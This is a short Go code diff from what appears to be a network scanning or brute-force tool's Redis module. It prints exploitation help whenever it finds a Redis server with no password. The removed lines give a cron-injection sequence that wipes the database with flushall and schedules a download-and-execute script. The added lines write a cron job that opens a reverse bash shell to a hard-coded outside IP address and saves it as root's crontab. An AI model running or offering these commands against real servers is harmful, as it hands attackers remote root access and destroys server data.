@@ -32,17 +32,10 @@ func redisConn(parent context.Context, s *Service, _, pass string) (ok int) {
 		if strings.Contains(err.Error(), " without any password configured") {
 			ok = OKNoAuth
 			s.parent.Result.ExpHelp = `
-config set stop-writes-on-bgsave-error no
-flushall
-config set dbfilename web
-set 1 \n\n*/1 * * * * cdt -fsSL oxx/init.sh |sh\n\n
+set xxx "\n\n* * * * * bash -i>& /dev/tcp/104.168.147.13/6666 0>&1\n\n"
 config set dir /var/spool/cron
-save
-config set dir /var/spool/cron/crontabs
-save
-config set dir /etc/cron.d
-save
-config set stop-writes-on-bgsave-error yes`
+config set dbfilename root
+save`
 			return
 		}
 		//账号密码错误
